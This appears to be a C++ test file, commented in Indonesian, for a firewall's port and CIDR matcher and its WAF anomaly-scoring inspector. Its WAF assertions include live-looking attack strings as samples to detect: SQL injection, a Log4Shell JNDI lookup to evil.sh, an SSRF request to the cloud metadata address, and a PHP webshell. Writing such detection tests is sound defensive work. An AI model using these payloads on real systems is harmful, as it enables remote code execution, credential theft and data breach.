// ============================================================================
// Test logika matcher & WAF — standalone, tidak butuh root / NFQUEUE.
// Build:  g++ -std=c++17 -I src tests/test_logic.cpp -o /tmp/test_logic
// Jalankan lalu cek exit code (0 = semua pass).
// ============================================================================
#include <cassert>
#include <iostream>
#include "../src/rules.hpp"
#include "../src/waf.hpp"

int main() {
    // ---------- portMatches ----------
    assert(portMatches(22, "*"));
    assert(portMatches(22, "22"));
    assert(!portMatches(23, "22"));
    assert(portMatches(1500, "1000-2000"));   // rentang
    assert(!portMatches(2500, "1000-2000"));
    assert(portMatches(80, "22,80,443"));     // daftar
    assert(portMatches(443, "22,80,443"));
    assert(portMatches(8500, "22, 8000-9000 ,443")); // campur + spasi
    assert(!portMatches(9500, "22,8000-9000"));
    std::cout << "[OK] portMatches\n";

    // ---------- isValidTarget ----------
    assert(isValidTarget("10.0.0.0/8"));
    assert(isValidTarget("192.168.1.1"));
    assert(isValidTarget("0.0.0.0/0"));
    assert(!isValidTarget("999.1.2.3"));
    assert(!isValidTarget("10.0.0.0/33"));     // prefix ngawur
    assert(!isValidTarget("bukan-ip"));
    std::cout << "[OK] isValidTarget\n";

    // ---------- ipInCidr ----------
    uint32_t ip = (10u << 24) | (1u << 16);    // 10.1.0.0 host-order
    assert(ipInCidr(ip, "10.0.0.0/8"));
    assert(!ipInCidr(ip, "11.0.0.0/8"));
    assert(ipInCidr(ip, "10.1.0.0/16"));
    std::cout << "[OK] ipInCidr\n";

    // ---------- WAF: payload bersih harus lolos ----------
    WafInspector waf(WAF_DEFAULT_THRESHOLD);
    auto r1 = waf.inspect("GET /index.html HTTP/1.1\r\nHost: example.com");
    assert(!r1.suspicious);
    std::cout << "[OK] WAF payload normal lolos\n";

    // ---------- WAF: double encoding tetap kedeteksi ----------
    // %27 -> ' ; %2527 -> %27 -> '
    auto r2 = waf.inspect("q=uni%4fn%20select%20*%20from%20users");
    assert(r2.suspicious && r2.totalScore >= WAF_DEFAULT_THRESHOLD); // UNION_SELECT=5
    auto r3 = waf.inspect("x=1%2527%20OR%201%3D1");  // double-encoded OR 1=1
    bool caughtDouble = false;
    for (auto& m : r3.matches) if (m.name == "OR_TRUE") caughtDouble = true;
    assert(caughtDouble);
    std::cout << "[OK] WAF single & double encoding kedeteksi\n";

    // ---------- Signature baru: Log4Shell / SSRF / webshell ----------
    auto r4 = waf.inspect("x=${jndi:ldap://evil.sh/a}");
    assert(r4.suspicious);
    bool jndi = false;
    for (auto& m : r4.matches) if (m.category == "RCE") jndi = true;
    assert(jndi);

    auto r5 = waf.inspect("url=http://169.254.169.254/latest/meta-data/");
    assert(r5.suspicious);

    auto r6 = waf.inspect("<?php system($_GET['c']); ?>"); // PHP_EVAL(7) + SHELL_META(6)
    assert(r6.suspicious);

    // Payload satu indikator ringan harusnya TIDAK diblokir (prinsip
    // anomaly scoring ModSecurity: blokir hanya kalau skor >= threshold,
    // bukan di match pertama) — cegah regresi jadi block-di-match-pertama.
    auto r7 = waf.inspect("comment=<b>halo dunia</b>");
    assert(!r7.suspicious);
    std::cout << "[OK] signature Log4Shell / SSRF metadata / webshell\n";
    std::cout << "[OK] anomaly scoring: match ringan tidak langsung block\n";

    // ---------- Threshold runtime ----------
    waf.setThreshold(50);
    assert(waf.threshold() == 50);
    assert(!waf.inspect("${jndi:ldap://evil.sh/a}").suspicious); // threshold tinggi -> lolos
    waf.setThreshold(WAF_DEFAULT_THRESHOLD);
    std::cout << "[OK] setThreshold runtime\n";

    std::cout << "\nSEMUA TEST LULUS \xE2\x9C\x94\n";
    return 0;
}
